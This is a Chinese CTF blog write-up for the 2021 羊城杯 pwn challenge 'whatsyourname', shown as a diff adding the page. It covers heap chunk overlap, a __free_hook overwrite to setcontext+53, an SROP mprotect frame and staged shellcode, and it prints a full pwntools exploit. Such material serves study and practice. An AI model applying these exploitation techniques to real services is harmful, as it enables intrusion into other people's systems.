@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[WP]羊城杯2021果然全程被ayoung大佬带飞QvQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&lt;WP&gt;羊城杯2021">
+<meta property="og:url" content="https://blog.mark0519.com/post/WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="[WP]羊城杯2021果然全程被ayoung大佬带飞QvQ">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-13T10:41:54.000Z">
+<meta property="article:modified_time" content="2021-11-21T14:16:38.608Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title><WP>羊城杯2021 | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          <WP>羊城杯2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-13 18:41:54" itemprop="dateCreated datePublished" datetime="2021-09-13T18:41:54+08:00">2021-09-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-21 22:16:38" itemprop="dateModified" datetime="2021-11-21T22:16:38+08:00">2021-11-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WP-羊城杯2021"><a href="#WP-羊城杯2021" class="headerlink" title="[WP]羊城杯2021"></a>[WP]羊城杯2021</h1><p>果然全程被ayoung大佬带飞QvQ</p>
+<span id="more"></span>
+
+<h2 id="whatsyourname"><a href="#whatsyourname" class="headerlink" title="whatsyourname"></a>whatsyourname</h2><p>chunk overlapping , setcontext , mprotect</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>每一个name由两个chunk构成,其中一个固定为0x20的chunk存放含有name信息chunk的地址,同时程序运行会存在大量脏数据,方便泄露libc地址</p>
+<p>首先利用chunk overlapping实现任意地址写</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>
+add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token comment"># 7</span>
+add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment"># 9</span>
+
+free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># unlink 6-8 (include 7)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token comment">#6</span>
+add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">#8</span>
+
+edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">-</span><span class="token number">18244200</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之后再编辑chunk8即可修改free hook的内容</p>
+<p>具体的lapping过程:</p>
+<p>申请</p>
+<p>add(0xa8) # 6<br>add(0x58) # 7<br>add(0xf8) # 8<br>add(0x100)# 9 -&gt; 隔开topchunk和之后放farme</p>
+<p>释放chunk6,并在chunk7的末尾(chunk 8 的prev size位)写上0x110(0xb0+0x60)</p>
+<p>释放chunk8 即可unlink 6 和8 ,但是其中包含了可控的chunk7</p>
+<p>利用chunk7 的编辑修改某个chunk指针指向free hook</p>
+<p>修改free hook为:p64(libc_base + libc.symbols[‘setcontext’] + 53) + p64(libc_base+libc.sym[‘__free_hook’]+0x18)*2 + asm(shell1)</p>
+<p>其中shell1:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">newexe <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+xor rdi,rdi
+mov rsi,%d
+mov edx,0x1000fr
+
+mov eax,0
+syscall
+
+jmp rsi
+'''</span> <span class="token operator">%</span> newexe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同时中chunk9中填入farme</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexe
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后只要释放chunk9即可触发SROP,执行sysread并执行</p>
+<p>发送 orw的shellcode即可得到flag</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+
+
+local <span class="token operator">=</span> <span class="token number">1</span>
+debug <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token keyword">if</span> local<span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./name"</span><span class="token punctuation">)</span>
+    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./name'</span><span class="token punctuation">)</span>
+<span class="token comment"># else:</span>
+<span class="token comment">#     p = remote(str(ip),port)</span>
+
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+<span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name size:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># clean 0x80 bins    </span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span>
+
+<span class="token comment"># leak heap</span>
+show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x0a\x31'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+heap <span class="token operator">=</span> heap<span class="token operator">>></span><span class="token number">12</span>
+heap <span class="token operator">=</span> heap<span class="token operator">*</span><span class="token number">0x1000</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># leak libc</span>
+show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+libc_mainarena_312 <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x0a\x31'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> libc_mainarena_312 <span class="token operator">-</span> <span class="token number">312</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>
+add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token comment"># 7</span>
+add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment"># 9</span>
+
+free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># unlink 6-8 (include 7)</span>
+<span class="token comment"># gdb.attach(p)</span>
+add<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token comment">#6</span>
+add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">#8</span>
+
+edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">-</span><span class="token number">18244200</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"setcontext+53:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+
+newexe <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+xor rdi,rdi
+mov rsi,%d
+mov edx,0x1000
+
+mov eax,0
+syscall
+
+jmp rsi
+'''</span> <span class="token operator">%</span> newexe
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexe
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
+
+edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shell1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+shell2 <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shell2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="关于setcontext的orw"><a href="#关于setcontext的orw" class="headerlink" title="关于setcontext的orw"></a>关于setcontext的orw</h3><p>对于一般开启和沙箱和保护全开的题目,利用这种操作orw最方便</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>setcontext主要内容如下:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&lt;setcontext&gt;:   push   rdi
+&lt;setcontext+1&gt;: lea    rsi,[rdi+0x128]
+&lt;setcontext+8&gt;: xor    edx,edx
+&lt;setcontext+10&gt;:    mov    edi,0x2
+&lt;setcontext+15&gt;:    mov    r10d,0x8
+&lt;setcontext+21&gt;:    mov    eax,0xe
+&lt;setcontext+26&gt;:    syscall
+&lt;setcontext+28&gt;:    pop    rdi
+&lt;setcontext+29&gt;:    cmp    rax,0xfffffffffffff001
+&lt;setcontext+35&gt;:    jae    0x7ffff7a54bc0 &lt;setcontext+128&gt;
+&lt;setcontext+37&gt;:    mov    rcx,QWORD PTR [rdi+0xe0]
+&lt;setcontext+44&gt;:    fldenv [rcx]
+&lt;setcontext+46&gt;:    ldmxcsr DWORD PTR [rdi+0x1c0]
+&lt;setcontext+53&gt;:    mov    rsp,QWORD PTR [rdi+0xa0]
+&lt;setcontext+60&gt;:    mov    rbx,QWORD PTR [rdi+0x80]
+&lt;setcontext+67&gt;:    mov    rbp,QWORD PTR [rdi+0x78]
+&lt;setcontext+71&gt;:    mov    r12,QWORD PTR [rdi+0x48]
+&lt;setcontext+75&gt;:    mov    r13,QWORD PTR [rdi+0x50]
+&lt;setcontext+79&gt;:    mov    r14,QWORD PTR [rdi+0x58]
+&lt;setcontext+83&gt;:    mov    r15,QWORD PTR [rdi+0x60]
+&lt;setcontext+87&gt;:    mov    rcx,QWORD PTR [rdi+0xa8]
+&lt;setcontext+94&gt;:    push   rcx
+&lt;setcontext+95&gt;:    mov    rsi,QWORD PTR [rdi+0x70]
+&lt;setcontext+99&gt;:    mov    rdx,QWORD PTR [rdi+0x88]
+&lt;setcontext+106&gt;:   mov    rcx,QWORD PTR [rdi+0x98]
+&lt;setcontext+113&gt;:   mov    r8,QWORD PTR [rdi+0x28]
+&lt;setcontext+117&gt;:   mov    r9,QWORD PTR [rdi+0x30]
+&lt;setcontext+121&gt;:   mov    rdi,QWORD PTR [rdi+0x68]
+&lt;setcontext+125&gt;:   xor    eax,eax
+&lt;setcontext+127&gt;:   ret
+&lt;setcontext+128&gt;:   mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
+&lt;setcontext+135&gt;:   neg    eax
+&lt;setcontext+137&gt;:   mov    DWORD PTR fs:[rcx],eax
+&lt;setcontext+140&gt;:   or     rax,0xffffffffffffffff
+&lt;setcontext+144&gt;:   ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一般我们设法调用setcontext+53(避开ldmxcsr DWORD PTR [rdi+0x1c0]并利用下面的操作修改寄存器)</p>
+<p>这个利用方式有点类似SROP，setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，而我们利用pwntools的SigreturnFrame可以更方便地进行赋值，只要把该SigreturnFrame写入一个chunk中，free它就能达到目的<br>我们这里考虑使用mprotect先赋予一段内存写的权限</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> new_addr
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当mprotect执行完时，rsp指向__free_hook+0x10，其中的值为__free_hook+0x18，这样我们就执行了第一段shellcode，这段shellcode的目的是往指定内存中读入shellcode并跳过去执行<br>我们第二段shellcode如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">mov rax<span class="token punctuation">,</span> <span class="token number">0x67616c662f2e</span> <span class="token punctuation">;</span><span class="token operator">//</span> <span class="token punctuation">.</span><span class="token operator">/</span>flag
+push rax
+
